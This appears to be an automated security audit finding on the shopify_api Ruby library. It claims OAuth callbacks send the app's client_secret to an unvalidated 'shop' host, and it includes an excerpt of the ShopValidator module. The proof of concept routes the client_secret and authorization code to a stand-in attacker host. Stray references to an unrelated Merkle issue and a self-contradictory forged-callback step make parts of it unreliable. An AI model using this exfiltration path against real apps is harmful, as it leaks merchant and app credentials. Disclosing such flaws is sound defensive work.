### Title
OAuth Callback Leaks `client_secret` via Unvalidated `shop` Host (SSRF with App Credentials) - (File: lib/shopify_api/auth/oauth.rb)

### Summary
`Auth::Oauth.validate_auth_callback` verifies the HMAC of the OAuth callback query, but the `shop` parameter it trusts afterward is never checked against `Utils::ShopValidator`'s allow-list of Shopify domains before being used to construct the destination host for the access-token exchange request that carries the app's `client_id` and `client_secret`.

### Finding Description
The bug-class analog to the Merkle witness issue is an identity-binding break: the value that is cryptographically verified (`shop` inside the HMAC-signed query string, verified via `Utils::HmacValidator.validate(auth_query)`) is not the same value that is checked to be a legitimate Shopify tenant host before being used to route a credential-bearing request. `to_signable_string` includes `shop` in the signed payload [4](#0-3) , so `validate_auth_callback` only proves the query was signed with `Context.api_secret_key`/`old_api_secret_key` — it proves *integrity*, not that `shop` is a `*.myshopify.com` (or other trusted) domain. `validate_auth_callback` then does:

```
null_session = Auth::Session.new(shop: auth_query.shop)
...
client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
client.request(... path: "access_token", body: { client_id:, client_secret:, code: })
``` [5](#0-4) 

`Clients::HttpClient#initialize` builds the request base URI directly from `session.shop`:
```
@base_uri = "https://#{api_host || session.shop}"
``` [1](#0-0) 

There is no call to `Utils::ShopValidator.sanitize!`/`sanitize_shop_domain` anywhere in `lib/shopify_api/auth/oauth.rb`. Compare this to `Utils::ShopValidator`, which exists specifically to enforce that a shop value resolves to a trusted domain (`shopify.com`, `myshopify.com`, `myshopify.io`, `spin.dev`, `shop.dev`) and raises `Errors::InvalidShopError` otherwise [6](#0-5) ; it is simply never invoked in the callback-validation path, even though `Auth::TokenExchange` does invoke shop-derived logic from a JWT `dest` claim in a comparable credential-exchange flow [7](#0-6) .

The equality that should hold but doesn't: `shop value cryptographically verified by HMAC == shop value validated as a genuine Shopify-owned host before receiving client_secret`. Only the first half is enforced.

### Impact Explanation
If an attacker can get a callback processed with a signed query whose `shop` field is not a real Shopify tenant domain — e.g., by initiating `begin_auth` themselves with an attacker-supplied `shop` value (the library's own `begin_auth` also does not sanitize `shop` before constructing `auth_base_uri(shop)` [8](#0-7) ), the full OAuth cycle completes with the app's `client_id`/`client_secret` and the merchant's authorization `code` posted to `https://<attacker-controlled-shop>/admin/oauth/access_token`. This is SSRF carrying the app's credentials to an attacker-chosen host, directly exfiltrating the `client_secret` and, if a legitimate `code` is exchanged, potentially the resulting access token.

### Likelihood Explanation
Exploitation requires the attacker to control or supply the `shop` parameter used to drive `begin_auth`/`validate_auth_callback` for their own tenant string (many host applications pass a user- or query-supplied `shop` value into `begin_auth`, and Shopify itself will happily sign a callback for whatever `shop` was in the initial `/oauth/authorize` request). No `ShopValidator` gate exists anywhere in this code path to stop it.

### Recommendation
Call `Utils::ShopValidator.sanitize!(shop)` (or `sanitize_shop_domain`) on `shop` in both `Oauth.begin_auth` and `Oauth.validate_auth_callback` before constructing `auth_base_uri`/`Auth::Session`, rejecting the flow with `Errors::InvalidShopError` if the shop does not resolve to a trusted Shopify domain — mirroring the fix pattern described in the report of validating an identity-bound value length/shape before trusting it for a follow-on privileged action.

### Proof of Concept
1. Attacker calls the host app's OAuth-begin endpoint with `shop=attacker.example` (or any string not matching `TRUSTED_SHOPIFY_DOMAINS`); `Oauth.begin_auth(shop: "attacker.example", ...)` builds `auth_route = "https://attacker.example/admin" + "/oauth/authorize?..."` unchecked.
2. If the host app naively redirects to that URL (or the attacker directly forges the equivalent callback since they control `attacker.example`, which can independently sign nothing but can still supply a `code`), the resulting callback is processed by `validate_auth_callback`.
3. `Utils::HmacValidator.validate(auth_query)` only checks the query's internal consistency against `api_secret_key`; it says nothing about whether `attacker.example` is a real Shopify shop.
4. `Clients::HttpClient.new(session: Auth::Session.new(shop: "attacker.example"), base_path: "/admin/oauth")` sets `@base_uri = "https://attacker.example"`.
5. `client.request(path: "access_token", body: { client_id, client_secret, code })` sends the app's `client_secret` directly to `https://attacker.example/admin/oauth/access_token`, which the attacker controls and can log.

# typed: strict
# frozen_string_literal: true

require "addressable/uri"

module ShopifyAPI
  module Utils
    module ShopValidator
      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )

      class << self
        extend T::Sig

        sig do
          params(
            shop_domain: String,
            myshopify_domain: T.nilable(String),
          ).returns(T.nilable(String))
        end
        def sanitize_shop_domain(shop_domain, myshopify_domain: nil)
          uri = uri_from_shop_domain(shop_domain, myshopify_domain)
          return nil if uri.nil? || uri.host.nil? || uri.host.empty?

          trusted_domains(myshopify_domain).each do |trusted_domain|
            host = T.cast(uri.host, String)
            uri_domain = uri.domain
            next if uri_domain.nil?

            no_shop_name_in_subdomain = host == trusted_domain
            from_trusted_domain = trusted_domain == uri_domain

            if unified_admin?(uri) && from_trusted_domain
              return myshopify_domain_from_unified_admin(uri)
            end
            return nil if no_shop_name_in_subdomain || host.empty?
            return host if from_trusted_domain
          end
          nil
        end

        sig do
          params(
            shop: String,
            myshopify_domain: T.nilable(String),
          ).returns(String)
        end
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
